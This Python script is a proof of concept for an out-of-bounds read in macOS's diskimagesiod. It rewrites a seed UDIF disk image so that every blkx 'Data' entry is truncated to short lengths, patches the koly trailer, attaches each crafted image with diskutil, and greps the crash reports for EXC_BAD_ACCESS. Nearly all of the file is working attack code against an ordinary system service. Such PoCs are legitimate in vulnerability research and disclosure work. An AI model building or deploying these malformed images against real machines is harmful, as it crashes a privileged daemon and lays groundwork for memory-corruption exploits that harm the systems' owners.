#!/usr/bin/env python3
# Craft a UDIF image whose blkx "Data" CFData is shorter than 0xcc bytes -> OOB read in
# diskimagesiod generate_blocks/block-parser. Sweep lengths; attach each under gmalloc; capture crash.
import os,sys,struct,plistlib,subprocess,glob,shutil,time
WORK="/tmp/blkxpoc"; os.makedirs(WORK,exist_ok=True)
SEED=sys.argv[1] if len(sys.argv)>1 else "/tmp/sdmgfuzz/seeds/udzo.dmg"
DR="/Library/Logs/DiagnosticReports"
def sh(c,t=15):
  try: return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=t)
  except subprocess.TimeoutExpired: return None
def latest_ips():
  l=sorted(glob.glob(f"{DR}/diskimagesiod-*.ips"),key=os.path.getmtime); return l[-1] if l else None

data=open(SEED,'rb').read()
# koly trailer = last 512 bytes; magic 'koly'
ko=data.rfind(b'koly')
assert ko>=0, "no koly"
trailer=bytearray(data[ko:ko+512])
# UDIF koly offsets (big-endian): XMLOffset @0xd8 (u64), XMLLength @0xe0 (u64)
XMLOff=struct.unpack_from(">Q",trailer,0xd8)[0]
XMLLen=struct.unpack_from(">Q",trailer,0xe0)[0]
print(f"seed={SEED} koly@{ko} XMLOff={XMLOff} XMLLen={XMLLen}")
xml=data[XMLOff:XMLOff+XMLLen]
pl=plistlib.loads(xml)
blkx=pl['resource-fork']['blkx']
print(f"blkx entries: {len(blkx)}; first Data len={len(blkx[0]['Data'])}")

def build(short_len):
  # shorten EVERY blkx Data to short_len (keep first bytes)
  import copy
  p2=copy.deepcopy(pl)
  for e in p2['resource-fork']['blkx']:
    d=e['Data']; e['Data']=d[:short_len] if short_len<=len(d) else d+b'\x00'*(short_len-len(d))
  newxml=plistlib.dumps(p2,fmt=plistlib.FMT_XML)
  # rebuild file: [everything before XML][newXML][koly with patched XMLLength]
  pre=data[:XMLOff]
  t2=bytearray(trailer); struct.pack_into(">Q",t2,0xe0,len(newxml))
  return bytes(pre)+newxml+bytes(t2)

lens=[0,1,4,8,0x20,0x80,0xcb,0xcc]
base=latest_ips()
for L in lens:
  img=build(L); p=f"{WORK}/short_{L}.dmg"; open(p,'wb').write(img)
  sh("sudo killall diskimagesiod 2>/dev/null",6); time.sleep(1)
  r=sh(f"diskutil image attach '{p}' --noMount --nobrowse 2>&1",20)
  st = "TIMEOUT/HANG" if r is None else (r.stdout.strip().split(chr(10))[0][:60])
  time.sleep(1)
  nb=latest_ips(); crashed = nb and nb!=base
  if r and r.stdout:
    for dev in [w for w in r.stdout.split() if w.startswith('/dev/disk')]: sh(f"diskutil eject {dev} 2>/dev/null||hdiutil detach {dev} -force 2>/dev/null",8); break
  tag=""
  if crashed:
    shutil.copy(nb,f"{WORK}/crash_len{L}.ips")
    typ=sh(f"sudo grep -oE 'EXC_BAD_ACCESS|EXC_CRASH' '{nb}'|head -1",6)
    pcl=sh(f"sudo grep -oE '0x10016[0-9a-f]+' '{nb}'|head -3|tr '\\n' ' '",6)
    tag=f"  *** CRASH ips={os.path.basename(nb)} type={typ.stdout.strip() if typ else '?'} near={pcl.stdout.strip() if pcl else ''}"
    base=nb
  print(f"len=0x{L:x} ({L:>3}): {st}{tag}")
print("DONE")
